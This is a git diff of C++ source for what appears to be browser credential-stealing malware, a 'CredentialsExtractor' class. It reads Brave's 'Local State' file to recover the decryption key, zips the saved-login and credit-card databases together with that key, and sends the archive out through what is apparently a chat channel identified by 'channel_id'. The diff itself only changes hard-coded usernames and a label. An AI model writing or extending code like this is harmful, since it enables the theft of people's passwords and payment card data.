@@ -32,7 +32,7 @@ std::vector<BYTE> CredentialsExtractor::decryptAESKey(const std::string& encrypt
 
 
 std::vector<BYTE>  CredentialsExtractor::getDecryptedKey() {
-    std::ifstream ifs("C:\\Users\\javier\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State");
+    std::ifstream ifs("C:\\Users\\Nitropc\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State");
     std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
     std::string key = "encrypted_key";
     std::size_t pos = content.find(key);
@@ -61,10 +61,10 @@ std::vector<BYTE>  CredentialsExtractor::getDecryptedKey() {
 void CredentialsExtractor::sendKeyAndDatabase(nlohmann::json json) {
     std::vector<BYTE> decryptedKey = getDecryptedKey();
     std::cout << decryptedKey.size() << std::endl;
-    std::string pathOfAccountsDatabase = R"(C:\Users\javier\Desktop\Login Data)";
-    std::string pathOfCreditCardsDatabase = R"(C:\Users\javier\Desktop\Web Data)";
+    std::string pathOfAccountsDatabase = R"(C:\Users\Nitropc\Desktop\Login Data)";
+    std::string pathOfCreditCardsDatabase = R"(C:\Users\Nitropc\Desktop\Web Data)";
     std::vector<std::filesystem::path> pathsToZip = {pathOfAccountsDatabase, pathOfCreditCardsDatabase};
-    std::vector<uint8_t> data = ZipCompressor::createZipInMemory(pathsToZip, decryptedKey, "encrypted key");
+    std::vector<uint8_t> data = ZipCompressor::createZipInMemory(pathsToZip, decryptedKey, "Encryption Key");
     download.downloadContentFromVector(data,json["channel_id"]);
     //RESULT result;
     //stream.sendBytes(decryptedKey);
